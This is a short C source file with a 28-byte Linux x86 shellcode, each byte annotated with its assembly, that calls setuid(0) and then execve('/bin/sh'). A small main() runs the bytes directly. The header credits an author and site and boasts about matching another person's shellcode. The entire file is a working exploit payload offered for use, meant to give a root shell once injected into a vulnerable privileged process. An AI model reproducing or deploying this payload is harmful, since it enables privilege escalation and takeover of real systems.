/*
 * (linux/x86) setuid(0) & execve("/bin/sh",0,0)
 * 28 bytes
 *
 * http://www.gonullyourself.org
 * sToRm <hixmostorm@hotmail.com>
 *
 * I made this, because http://www.milw0rm.com/shellcode/7115 felt the need
 * to express his "superior" 28-byte shellcode in all caps.  I wasn't able
 * to beat his code, but it's no longer special.
 */

char shellcode[] =
                                // <_start>:
    "\x31\xdb"                  // xor    %ebx,%ebx
    "\x6a\x17"                  // push   $0x17
    "\x58"                      // pop    %eax
    "\xcd\x80"                  // int    $0x80
    "\xf7\xe3"                  // mul    %ebx
    "\xb0\x0b"                  // mov    $0xb,%al
    "\x31\xc9"                  // xor    %ecx,%ecx
    "\x51"                      // push   %ecx
    "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
    "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
    "\x89\xe3"                  // mov    %esp,%ebx
    "\xcd\x80"                  // int    $0x80
;

int main() {

    int (*f)() = (int(*)())shellcode;
    printf("Length: %u\n", strlen(shellcode));
    f();

}